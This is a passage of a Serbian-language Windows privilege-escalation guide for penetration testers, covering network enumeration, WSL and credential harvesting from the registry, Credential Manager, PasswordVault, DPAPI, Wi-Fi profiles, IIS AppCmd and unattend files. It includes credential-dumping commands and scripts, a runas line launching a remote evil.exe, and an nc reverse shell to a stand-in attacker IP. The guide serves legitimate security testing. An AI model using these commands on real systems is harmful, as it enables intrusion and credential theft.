Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao korisnik desktopa samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija pokrenuta pod nalogom sa višim privilegijama zaseban je cilj za proveru: listener i putanja do binarne datoteke pasivni su tragovi, dok je za utvrđivanje mogućnosti napada preko ranjivosti memorije potrebna analiza baš te binarne datoteke i ulaznih podataka do kojih se može doći. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite koja je pozadinska usluga u pitanju; samo pravilo prosleđivanja ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall pravila

[**Proverite ovu stranicu za komande povezane sa Firewall-om**](../basic-cmd-for-pentesters.md#firewall) **(izlistavanje pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više[ komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarna datoteka `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete da slušate na bilo kom portu (kada prvi put upotrebite `nc.exe` za osluškivanje porta, GUI će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite `WSL` sistem datoteka u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje Windows administratorska prava. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, pregledajte datoteke istorije shell-a (uključujući `/root/.bash_history`) u potrazi za komandama koje su možda zabeležile akreditive; za eskalaciju su i dalje potrebni važeći nalog sa višim privilegijama i dozvoljen put za autentifikaciju. Raspored `LocalState\rootfs` važi za starije instalacije WSL-a; WSL 2 obično čuva distribuciju na virtuelnom disku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), pa najpre utvrdite konkretnu distribuciju i putanju do njenog skladišta. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog prikupljanja podataka.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Neprazna vrednost `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz plaintext vrednosti u registru. Ako je `AutoAdminLogon=1`, ali plaintext lozinka nije čitljiva, to je samo trag: [Sysinternals Autologon može da čuva lozinku kao LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajeno čitanje registra ne utvrđuje da li taj secret postoji ili može da se preuzme. Pre nego što prijavite izložene akreditive, proverite prava pristupa i stvarnu konfiguraciju prijavljivanja.

### Menadžer akreditiva / Windows Vault

Preuzeto sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled, moglo bi da zvuči kao da korisnici mogu da čuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive koje Windows može automatski da koristi za prijavljivanje korisnika. To znači da **svaka Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, kao i da upotrebi dostavljene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa menadžerom akreditiva i zatraži akreditive za taj resurs** iz podrazumevanog skladišta vault-a.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na mašini.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete koristiti `runas` sa opcijom `/savecred` da biste koristili sačuvane akreditive. Sledeći primer pokreće udaljeni binarni fajl putem SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa datim akreditivima.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da možete koristiti mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili modul [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne UWP aplikacije za Windows, Microsoft Edge i moderne sistemske usluge čuvaju tokene za autentifikaciju i lozinke u otvorenom tekstu unutar Universal Windows Platform (UWP) `PasswordVault` skladišta (koje je takođe dostupno kao `Web Credentials` u `vaultcmd`). Ovo skladište je izolovano po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Pokrenite ovu PowerShell komandu u aktivnoj korisničkoj sesiji da biste odmah izvršili dump i dešifrovali sva sačuvana korisnička imena i lozinke u otvorenom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka i pretežno se koristi u operativnom sistemu Windows za simetrično šifrovanje privatnih asimetričnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu kao značajan doprinos entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisničkih tajni za prijavljivanje**. U slučajevima koji uključuju sistemsko šifrovanje, koristi tajne za domensku autentifikaciju sistema.

Šifrovani korisnički RSA ključevi, zaštićeni pomoću DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja [bezbednosni identifikator](https://en.wikipedia.org/wiki/Security_Identifier) korisnika. **DPAPI ključ, smešten zajedno sa glavnim ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa njegov sadržaj nije moguće prikazati pomoću komande `dir` u CMD-u, ali se može prikazati kroz PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa akreditivima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete **izvući mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije, kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI-ja**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili putanju `.xml`. Ako skripta ili inventar datoteka ukazuje na neku datoteku, pronađite stvarnu putanju do profila naloga umesto da pretpostavite da se nalazi u `C:\Users`: [Windows može smestiti profile na druge lokacije](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Datoteka koja može da se pročita samo je trag; [Windows `Export-Clixml` povezuje šifrovani akreditiv sa korisnikom i računarom koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki oporavljeni nalog mora zasebno imati važeća prava na predviđenoj usluzi. Najpre proverite putanje i ACL-ove, bez prikazivanja šifrovanih ili čitljivih vrednosti tokom rutinskog popisivanja.

Da biste **dešifrovali** PS akreditiv iz datoteke koja ga sadrži, možete uraditi sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menadžer akreditiva za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul **Mimikatz** `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Pomoću modula **Mimikatz** `sekurlsa::dpapi` možete **iz memorije izdvojiti mnoge DPAPI masterkeys**

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljive XML datoteke u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući datoteke uobičajenih naziva kao što je `config.xml`. Utvrdite šemu veza i šifrovane atribute `Password` pre nego što XML datoteku smatrate mogućim izvorom akreditiva. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom opsežnog pregleda.

**Izvozi profila Remote Desktop Plus** mogu biti čitljivi i u korisničkim fasciklama ili zajedničkoj fascikli za administraciju. Nasleđeni izvoz `profiles.xml` sadrži stavke `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Smatrajte neprazan element lozinke mogućim izvorom akreditiva, ali nemojte ga ispisivati niti pretpostavljati da je u njemu otvoren tekst: [dobavljač napominje](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kom je profil napravljen ili podešena kao manje stroga. Proverite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške u `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili drugačije aplikacije mogu koristiti druga skladišta u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladišta koristi pre nego što odsustvo SQLite datoteke smatrate dokazom da nema beležaka.

Ako Sticky Notes koristi SQLite zapisivanje unapred u dnevnik (WAL), sama kopija datoteke `plum.sqlite` možda neće sadržati nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` uz konzistentnu kopiju baze podataka, kao i `plum.sqlite-shm` ako je dostupna; indeks deljene memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite dokumentaciju za WAL](https://www.sqlite.org/wal.html). Beleška koja sadrži naziv naloga ili lozinku samo je mogući izvor akreditiva: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Zapis iz šifrovanog upravljača lozinkama zahteva i stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju da bi mogao da potvrdi prijavu sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga sa nivoom visokog integriteta.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **akreditivi** koji se mogu **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalacioni programi se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i registar (akreditivi)

### Artefakti akreditiva u registru alata za podršku

Neke starije instalacije alata za udaljenu podršku zadržavaju nazive vrednosti povezane sa lozinkama pod fiksnim ključevima registra aplikacije. Na primer, `SecurityPasswordAES` u programu TeamViewer označavao je konfigurisanu statičku lozinku sesije u verzijama pre verzije 9, prema [objašnjenju proizvođača o ključevima registra](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Oznaka u nazivu vrednosti samo je smernica za proveru: pre procene akreditiva proverite instaliranu verziju, čitljivost podataka vrednosti, format i trenutno ponašanje pri autentifikaciji. Prelazak sa lozinke za udaljenu podršku na privilegovaniji Windows nalog zahteva i stvarnu ponovnu upotrebu lozinke, kao i ovlašćenje za taj nalog. Izbegavajte uključivanje šifroteksta i otkrivenih lozinki u rutinski izlaz enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako postoji sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista kontroliše uređivanje i nije bezbednosna funkcija; ona sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo relevantne datoteke za koje imate ovlašćenje i nemojte ispisivati moguće tajne tokom opšte enumeracije. Sama putanja do čitljive `.xlsx` datoteke, zaštićeni list ili skrivena kolona ne dokazuju da akreditivi postoje niti da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Zadržane izmene zakrpa CI servera

CI server može da zadrži dostavljene izmene izvornog koda u svom direktorijumu sa podacima čak i nakon završetka izgradnje. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) da se `system/changes` koristi za čuvanje izmena sa udaljenih pokretanja; direktorijum sa podacima može da se konfiguriše i ne mora da se nalazi u `ProgramData`. Čitljiva zakrpa može da sačuva uklonjene ili dodate reference na datoteku sa akreditivima, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva AES ključ, kao i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim, uz odgovarajuće ovlašćenje, proverite relevantan sadržaj bez ispisivanja tajni u rutinskom izlazu enumeracije. Sama putanja do zakrpe, šifrovana vrednost ili referenca na ključ ne dokazuju da su akreditivi važeći niti da omogućavaju pristup sa višim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte unošenje tajni u izmene za izgradnju.

### Prilagođeno rotiranje lozinke lokalnog administratora

Samostalno napravljena skripta za rotiranje lozinki može da čuva šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, a da akreditive za skladište podataka drži u čitljivoj datoteci `.env` ili pored binarne datoteke programa za ažuriranje. Zajedno proverite zakazani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole skladišta podataka. Lokalni datastore dostupan samo preko loopback i dalje je dostupan lokalnom korisniku koji ima važeće akreditive, ali sama autentifikacija ne dokazuje da taj korisnik sme da čita relevantne zapise. Ako je seme šifrovanja ili ključni materijal dostupan pored šifroteksta, proverite tačan postupak izvođenja ključa pre nego što se oslonite na šifrovanje. Šema koja deterministički izvodi AES ključ iz izloženog semena pomoću Go-ovog [`math/rand`](https://pkg.go.dev/math/rand) nije prikladna za zaštitu te lozinke; Go navodi da taj paket nije namenjen nasumičnosti osetljivoj sa bezbednosnog stanovišta. Pre nego što otkrivenu lozinku smatrate putem za eskalaciju privilegija, potvrdite da je i dalje važeća i da pripada nalogu iz grupe lokalnih administratora. Zakazani zadatak, putanja do `.env` datoteke ili šifrovani blok sami po sebi ne dokazuju ništa od navedenog. Izbegavajte uključivanje lozinki i ključnog materijala u rutinski izlaz enumeracije.

Koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) za upravljanje lozinkama lokalnih administratora. Njegovo skladištenje zasnovano na direktorijumu ili Entra platformi i kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; isto tako, [uloge u Elasticsearch-u](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba akreditiva

Neki dodaci za Java servere distribuiraju se kao JAR arhive u direktorijumu servera `plugins`. Čitljiv prilagođeni dodatak može da sadrži konfiguraciju ili bajtkod sa ugrađenim akreditivom usluge. Arhivu pregledajte samo uz odgovarajuće ovlašćenje i nemojte uključivati otkrivene tajne u rutinski izlaz enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a otkrivena lozinka usluge vodi do viših privilegija samo ako važi i za privilegovaniji nalog. Proverite relevantne ACL-ove datoteka i zamenite ponovo korišćene akreditive različitim tajnama. Pogledajte [uputstvo za instalaciju dodataka PaperMC-a](https://docs.papermc.io/paper/adding-plugins/) za raspored direktorijuma i [Oracle-ovu dokumentaciju za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhiva.

### Akreditivi ugrađene baze podataka Openfire-a

Instalacija Openfire-a koja koristi ugrađenu bazu podataka može da čuva `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da ga čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire-ova [dokumentacija o provajderu korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da lozinke mogu da se čuvaju kao običan tekst ili da budu šifrovane ključem koji se čuva u tom svojstvu. Otkrivena lozinka važna je za eskalaciju samo ako je i dalje važeća za identitet sa višim privilegijama; samo ime datoteke ne dokazuje ni da postoji pristup za čitanje ni da se akreditivi ponovo koriste. Putanja služi kao smernica za inventarizaciju, zato nemojte uključivati sadržaj baze podataka ni akreditive u rutinski izlaz enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može da otkrije konfigurisane portove i interfejs za povezivanje administratorske konzole čak i kada se koristi spoljna baza podataka. Openfire obično vezuje administratorsku konzolu za loopback; lokalni nalog i dalje može da dosegne tu adresu ako listener radi. Zajedno proverite aktivni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može da pokrene njegov kod u kontekstu usluge, što može da podrazumeva visoke privilegije ako usluga radi kao LocalSystem. Podudaranje lozinke naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte proizvođačev [vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [API svojstvo za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za forenzičko upravljanje

Konfiguracije Velociraptor servera, koje se obično zovu `server.config.yaml`, mogu da sadrže `CA.private_key` internog CA sertifikata. Ako korisnik sa nižim privilegijama može da čita taj ključ, možda može da izda API klijentski sertifikat. Da li to omogućava sticanje viših privilegija zavisi od korisničkih uloga na serveru, dostupnosti API-ja i identiteta pod kojim se izvršava server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne potvrđuje pristup serverskom CA sertifikatu. U nekim instalacijama privatni ključ CA sertifikata čuva se van mreže, pa čitljiva konfiguracija servera možda uopšte ne sadrži ključ za potpisivanje.

Na Windows serveru proverite ACL konfiguracije **servera** u direktorijumu za instalaciju i svih zaštićenih rezervnih kopija. Jedna moguća lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako se razlikuje, koristite putanju podešenu za uslugu. Potvrdite da trenutni identitet može da čita datoteku i da je `CA.private_key` zaista prisutan. Nemojte ispisivati privatni ključ u evidencijama niti u izlazu enumeracije. Proizvođačev tok rada `config api_client` koristi ključ CA sertifikata za izdavanje klijentskog sertifikata, ali je potrebna i odgovarajuća uloga na serveru; njeno kreiranje ili menjanje može da zahteva pristup za upis u datastore ili ponovno pokretanje. Postojeći privilegovani identitet servera može da pruži put do pristupa čak i kada ti upisi nisu mogući. API upiti sa pravima za izvršavanje rade u relevantnom kontekstu servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, držite ključ za potpisivanje CA sertifikata van mreže gde je to moguće i ograničite API uloge i pristup listener-u. Pogledajte [Velociraptor API dokumentaciju](https://docs.velociraptor.app/docs/server_automation/server_api/) i [smernice za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY akreditivi

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban menadžer sesija. Njegova izvorna šifrovana datoteka može biti na lokaciji `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugom mestu. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i mogu sadržati sesije, ključeve, skripte, oznake i relacije; njegov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi lokaciju izvorne datoteke. Najpre proverite dozvole za datoteke i putanje. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### Putty SSH ključevi hostova

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos na toj putanji, verovatno je reč o sačuvanom SSH ključu. Sačuvan je šifrovan, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta i želite da se automatski pokrene pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije važeća. Pokušao sam da napravim SSH ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko SSH-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije zabeležio korišćenje `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za automatizovanu instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
